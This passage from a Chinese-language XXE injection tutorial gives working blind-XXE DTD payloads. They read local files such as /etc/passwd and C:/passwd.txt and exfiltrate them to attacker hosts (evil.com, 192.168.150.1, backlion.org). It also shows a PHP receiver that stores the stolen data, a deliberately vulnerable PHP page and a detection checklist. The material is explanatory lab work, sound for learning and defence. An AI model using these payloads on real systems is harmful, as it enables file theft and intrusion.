<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234002354-1423087805.gif" alt="img"></p>
<p>Chrome：</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234002715-2028991902.gif" alt="img"></p>
<p>这也是比较蛋疼的特性，因为php，java，C#等语言的内置XML解析器都是有一定差别的，也就给漏洞利用带来不便。</p>
<h3 id="（3）Bllind-XXE"><a href="#（3）Bllind-XXE" class="headerlink" title="（3）Bllind XXE"></a>（3）Bllind XXE</h3><p>如果目标服务器没有回显，就只能用 Blind XXE 了。原理就是带着获取的文件源码以 get 参数或其他形式去访问我们的服务器，然后在日志里就可以找到我们要获取的内容了。</p>
<p>Blink XXE主要使用了DTD约束中的参数实体和内部实体。<br>参数实体是一种只能在DTD中定义和使用的实体，一般引用时使用%作为前缀。而内部实体是指在一个实体中定义的另一个实体，也就是嵌套定义。</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
   &lt;!ENTITY % hs SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;1.txt&quot;&gt;
   &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;xxx&#x2F;xxx.xml&quot;&gt;
   %remote;
   %all;
]&gt;
&lt;root&gt;&amp;send;&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>xxx.xml</p>
<p><code>&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http://xxx/x.php?hs=%hs;&#39;&gt;&quot;&gt;</code></p>
<p>这里解释下，%remote; 会把外部文件引入到这个 XML 中，%all; 替换为后面的嵌套实体，这时再在 root 节点中引入 send 实体，便可实现数据转发。如果在 xxx.xml 中 send 实体是参数实体的话，也可以采用下面的形式。</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;  
  &lt;!DOCTYPE ANY[  
  &lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;1.txt&quot;&gt;  
  &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;xxx&#x2F;xxx.xml&quot;&gt;  
  %remote;  
  %all;  
  %send;  
]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>xxx.xml</p>
<p><code>&lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &#39;http://xxx/x.php?hs=%hs;&#39;&gt;&quot;&gt;</code></p>
<h4 id="l-原理说明"><a href="#l-原理说明" class="headerlink" title="l 原理说明"></a>l 原理说明</h4><p>对于传统的XXE来说，要求在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，例如上述方式一。</p>
<p>如果服务器没有回显，只能使用Blind XXE漏洞来构建一条带外信道提取数据（Out-Of-Band）。</p>
<p>但直接在内部实体定义中引用另一个实体的这种方法行不通</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
  &lt;!DOCTYPE root [
  &lt;!ENTITY % param1 &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;1.txt&quot;&gt;
  &lt;!ENTITY % param2 &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;?%param1&quot;&gt;
  %param2;
]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>最简单的无非是通过参数实体引用，发送一个http请求到我们服务器，然后观察我们服务的日志</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
  &lt;!DOCTYPE root [
  &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;evil.com&#x2F;blind_xxe_test&quot;&gt;
  %remote;]&gt;
&lt;root&#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果在服务日志上能接收到则说明存在漏洞</p>
<p>于是考虑内部实体嵌套的形式：</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
  &lt;!DOCTYPE root [
  &lt;!ENTITY % param1 &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;1.txt&quot;&gt;
  &lt;!ENTITY % param2 &quot;&lt;!ENTITY % param222 SYSTEM&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;?%param1;&#39;&gt;&quot;&gt;
  %param2;
]&gt;
&lt;root&gt;
  [This is my site]
&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p> 但是这样做行不通，原因是不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234003130-2143316555.gif" alt="img"></p>
<p>解决方案是：</p>
<p>将嵌套的实体声明放入到一个外部文件中，这里一般是放在攻击者的服务器上，这样做可以规避错误。</p>
<p>和引入方式三有些雷同，如下：</p>
<p>src.xml</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
  &lt;!DOCTYPE ANY[
  &lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;1.txt&quot;&gt;
  &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;192.168.150.1&#x2F;evil.xml&quot;&gt;
  %remote;
  %all;
]&gt;
&lt;root&gt;&amp;send;&lt;&#x2F;root&gt;•<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>evil.xml</p>
<p><code>&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http://192.168.150.1/1.php?file=%file;&#39;&gt;&quot;&gt;</code></p>
<p>实体remote，all，send的引用顺序很重要，首先对remote引用目的是将外部文件evil.xml引入到解释上下文中，然后执行%all，这时会检测到send实体，在root节点中引用send，就可以成功实现数据转发。</p>
<p>另外一种方法是使用CDATA，但是并非像wooyun文章说的那样可以读取任意值</p>
<h4 id="l-读任意文件"><a href="#l-读任意文件" class="headerlink" title="l 读任意文件"></a>l 读任意文件</h4><p>php://filter/convert.base64-encode/resource=想要读取的文件路径</p>
<h4 id="l-Java中的应用"><a href="#l-Java中的应用" class="headerlink" title="l Java中的应用"></a>l Java中的应用</h4><p>1.file:///可以列目录:</p>
<p>2.OOB:</p>
<p>  gopher（1.7u7, 1.6u32以前|<a target="_blank" rel="noopener" href="https://bugzilla.redhat.com/show_bug.cgi?id=865541#c0">7u9 6u37以前</a> ？），配合nc；其他情况用ftp</p>
<p>3.上传文件:</p>
<p>  需要进行长链接，通过jar协议（jar:<a target="_blank" rel="noopener" href="http://127.0.0.1:2014/xxe.jar!/）">http://127.0.0.1:2014/xxe.jar!/）</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/pwntester/BlockingServer">  https://github.com/pwntester/BlockingServer</a> </p>
<p>4.ftp oob:</p>
<p>在jdk 1.6.35 以上，可以读取tomcat-users，如果管理页面不删，版本如果高于前述情况，也应该能读取</p>
<p> <img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234003593-607819249.gif" alt="img"></p>
<p>注意：1.6.31以下是不行的,因此结合文件上传和gopher协议来看，基于tomcat成功的getshell，主要因素在于jdk版本，成功的范围很小</p>
<p>5.读XML标签及属性值</p>
<p>前提是内部需要设置 factory.setValidating(true)</p>
<p>例1：读取属性值</p>
<p>xml文档中的标签属性需通过ATTLIST为其设置属性<br>语法格式：</p>
<p><code>&lt;!ATTLIST 元素名 属性名 属性值类型 默认值&gt;</code></p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE tomcat-users [
  &lt;!ELEMENT role EMPTY&gt;
  &lt;!ELEMENT user EMPTY&gt;
  &lt;!ATTLIST user
    username (a|b) #REQUIRED
    password (a|b) #REQUIRED
  \&gt; 
]&gt;
&lt;tomcat-users&gt;
 &lt;role rolename&#x3D;&quot;tomcat&quot;&#x2F;&gt;
 &lt;user username&#x3D;&quot;tomcat&quot; password&#x3D;&quot;tomcat&quot; roles&#x3D;&quot;tomcat&quot;&#x2F;&gt;
&lt;&#x2F;tomcat-users&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p> java Xerces方法的解析结果为（其他解析方式不行）：</p>
<p>Warning: validation was turned on but an org.xml.sax.ErrorHandler was not set, which is probably not what is desired. Parser will use a default ErrorHandler to print the first 10 errors. Please call the ‘setErrorHandler’ method to fix this.<br>Error: URI=null Line=10: Element type “tomcat-users” must be declared.<br>Error: URI=null Line=11: Attribute “rolename” must be declared for element type “role”.<br>Error: URI=null Line=12: Attribute “username” with value “tomcat” must have a value from the list “a b “.<br>Error: URI=null Line=12: Attribute “password” with value “tomcat” must have a value from the list “a b “.<br>Error: URI=null Line=12: Attribute “roles” must be declared for element type “user”.</p>
<p>实际运用时，是没办法解析tomcat-users.xml的文档的，因为会把 XML 声明代入而造成解析出错</p>
<p>例2：定义标签顺序报错<br>具体示例如下：<br>首先建立DTD文件，文件名：person.dtd<br>文件内容：</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; ?&gt;
&lt;!ELEMENT person (name, sex, birthday)*&gt;
&lt;!ELEMENT name (#PCDATA)&gt;
&lt;!ELEMENT sex (#PCDATA)&gt;
&lt;!ELEMENT birthday (#PCDATA)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后建立两个利用这个dtd文件的xml文件<br>文件名：person.xml</p>
<p>文件内容：</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;
&lt;!DOCTYPE person SYSTEM &quot;person.dtd&quot;&gt;
&lt;person&gt;
   &lt;name&gt;tom&lt;&#x2F;name&gt;
   &lt;sex&gt;male&lt;&#x2F;sex&gt;
   &lt;birthday&gt;1949-10-01&lt;&#x2F;birthday&gt;
&lt;&#x2F;person&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>文件名：worker.xml<br>文件内容：</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" ?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">person</span> <span class="token name">SYSTEM</span> <span class="token string">"person.dtd"</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>person</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>tom<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sex</span><span class="token punctuation">></span></span>male<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sex</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>birthday</span><span class="token punctuation">></span></span>1949-10-01<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>birthday</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>job</span><span class="token punctuation">></span></span>it<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>job</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>person</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们可以看到worker.xml文件不符合dtd的规定，多了一个job的标签。<br>然后建立java文件<br>文件名：ValidateXMLDTD.java</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">xmlvalidate</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileNotFoundException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>parsers<span class="token punctuation">.</span></span><span class="token class-name">DocumentBuilder</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>parsers<span class="token punctuation">.</span></span><span class="token class-name">DocumentBuilderFactory</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>parsers<span class="token punctuation">.</span></span><span class="token class-name">ParserConfigurationException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>sax<span class="token punctuation">.</span></span><span class="token class-name">SAXException</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ValidateXMLDTD</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// System.out.println("测试符合DTD规范的XML文件");</span>
        <span class="token comment">// testPerson();</span>
        <span class="token comment">// System.out.println("测试不符合DTD规范的XML文件");</span>
        <span class="token comment">// testWorkder();</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">testPerson</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">DocumentBuilderFactory</span> dbf <span class="token operator">=</span> <span class="token class-name">DocumentBuilderFactory</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            dbf<span class="token punctuation">.</span><span class="token function">setValidating</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//这里很重要</span>
            <span class="token class-name">DocumentBuilder</span> db <span class="token operator">=</span> dbf<span class="token punctuation">.</span><span class="token function">newDocumentBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            db<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>FileInputStream</span><span class="token punctuation">(</span><span class="token string">"person.xml"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">FileNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// TODO Auto-generated catch block</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ParserConfigurationException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// TODO Auto-generated catch block</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SAXException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// TODO Auto-generated catch block</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// TODO Auto-generated catch block</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">testWorkder</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">DocumentBuilderFactory</span> dbf <span class="token operator">=</span> <span class="token class-name">DocumentBuilderFactory</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            dbf<span class="token punctuation">.</span><span class="token function">setValidating</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">DocumentBuilder</span> db <span class="token operator">=</span> dbf<span class="token punctuation">.</span><span class="token function">newDocumentBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            db<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>FileInputStream</span><span class="token punctuation">(</span><span class="token string">"worker.xml"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">FileNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// TODO Auto-generated catch block</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ParserConfigurationException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// TODO Auto-generated catch block</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SAXException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// TODO Auto-generated catch block</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// TODO Auto-generated catch block</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>修改一下main方法中的注释语句，运行一下，执行结果：<br>运行testPerson的时候，只输出：测试符合DTD规范的XML文件<br>，而运行testWorker的时候，输入如下内容：测试不符合DTD规范的XML文件<br>Warning: validation was turned on but an org.xml.sax.ErrorHandler was not<br>set, which is probably not what is desired. Parser will use a default<br>ErrorHandler to print the first 10 errors. Please call<br>the ‘setErrorHandler’ method to fix this.<br>Error: URI=null Line=7: Element type “job” must be declared.<br>Error: URI=null Line=8: The content of element type “person” must match “(name,sex,birthday)*”</p>
<h3 id="（4）测试"><a href="#（4）测试" class="headerlink" title="（4）测试"></a>（4）测试</h3><p>【1.php】</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
  <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"1.txt"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>【test.php】</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  
<span class="token variable">$xml</span><span class="token operator">=</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span>  
<span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string double-quoted-string">"1.0"</span><span class="token delimiter important">?></span></span>  
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span><span class="token punctuation">[</span><span class="token internal-subset">  
&lt;!ENTITY % file SYSTEM "file:///C:/passwd.txt">  
&lt;!ENTITY % remote SYSTEM "http://192.168.150.1/evil.xml">  
%remote;  
%all;  
   %send;  
</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>  
EOF;  
$data = simplexml_load_string($xml) ;  
echo "<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span>" ;  
print_r($data) ;  
?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>【evil.xml】</p>
<p><code>&lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &#39;http://192.168.150.1/1.php?file=%file;&#39;&gt;&quot;&gt;</code></p>
<p>访问<a target="_blank" rel="noopener" href="http://localhost/test.php">http://localhost/test.php</a>, 这就是模拟攻击者构造XXE请求，然后存在漏洞的服务器会读出file的内容（c:/1.txt），通过带外通道发送给攻击者服务器上的1.php，1.php做的事情就是把读取的数据保存到本地的1.txt中，完成Blind XXE攻击。</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234004229-1126252116.gif" alt="img"></p>
<p>攻击之后1.txt中的数据：</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234004709-1408752219.gif" alt="img"></p>
<p>攻击者服务器日志：</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234005064-610786387.gif" alt="img"></p>
<h3 id="（5）总结"><a href="#（5）总结" class="headerlink" title="（5）总结"></a>（5）总结</h3><p>遇到XML相关的交互过程，以如下步骤判断是否存在漏洞：</p>
<p>（1）检测XML是否会被解析：</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;”1.0” encoding&#x3D;”UTF-8”?&gt;
&lt;!DOCTYPE ANY [ 
  &lt;!ENTITY shit “this is shit”&gt; 
]&gt; 
&lt;root&gt;&amp;shit;&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果$shit;变成了”this is shit”，那就继续第二步。</p>
<p>（2）检测服务器是否支持外部实体：</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;”1.0” encoding&#x3D;”UTF-8”?&gt; 
&lt;!DOCTYPE ANY [
  &lt;!ENTITY % shit SYSTEM “http:&#x2F;&#x2F;youhost&#x2F;evil.xml”&gt;
  %shit;
]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求evil.xml的HTTP request。</p>
<p>（3）如果上面两步都支持，那么就看能否回显。如果能回显，就可以直接使用外部实体的方式进行攻击。当然有时候服务器会不支持一般实体的引用，也就是在DTD之外无法引用实体，如果这样的话，只能使用Blind XXE攻击。</p>
<p>（4）如果不能回显，毫无疑问，使用Blind XXE攻击方法。</p>
<h2 id="5-XXE的几种外部引入方式"><a href="#5-XXE的几种外部引入方式" class="headerlink" title="5.XXE的几种外部引入方式"></a>5.XXE的几种外部引入方式</h2><p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
<p>引入外部实体方式有多种，比如：</p>
<h3 id="（1）恶意引入外部实体方式一"><a href="#（1）恶意引入外部实体方式一" class="headerlink" title="（1）恶意引入外部实体方式一"></a>（1）恶意引入外部实体方式一</h3><p>XML内容：</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234005652-381623393.gif" alt="img"></p>
<h3 id="（2）恶意引入外部实体方式二"><a href="#（2）恶意引入外部实体方式二" class="headerlink" title="（2）恶意引入外部实体方式二"></a>（2）恶意引入外部实体方式二</h3><p><code>&lt;!DOCTYPE a [ &lt;!ENTITY %d SYSTEM &quot;http://www.backlion.org/attack.dtd&quot;&gt; %d; ]&gt;</code></p>
<p>其中attack.dtd的内容为：</p>
<p><code>&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></p>
<p>XML内容：</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234006905-1089289427.gif" alt="img"></p>
<p>DTD文件(evil.dtd)内容：</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234007386-48606999.gif" alt="img"></p>
<h3 id="（3）恶意引入外部实体方式三"><a href="#（3）恶意引入外部实体方式三" class="headerlink" title="（3）恶意引入外部实体方式三"></a>（3）恶意引入外部实体方式三</h3><p>XML内容：</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234008026-1355120168.gif" alt="img"></p>
<p>DTD文件(evil.dtd)内容：</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234008299-1543150332.gif" alt="img"></p>
<p> 另外，不同程序支持的协议不一样，</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234008831-87419652.gif" alt="img"></p>
<p>上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234009115-5824616.gif" alt="img"></p>
<h1 id="XXE攻击利用"><a href="#XXE攻击利用" class="headerlink" title="XXE攻击利用"></a>XXE攻击利用</h1><p>准备一个有XXE漏洞的文件,如下:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$xml</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php://input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$xml</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>"</span> <span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token comment">//注释掉该语句即为无回显的情况</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>xxe利用主要有：任意文件读取、内网信息探测（包括端口和相关web指纹识别）、DOS攻击、远程命名执行<br>POC主要有：</p>
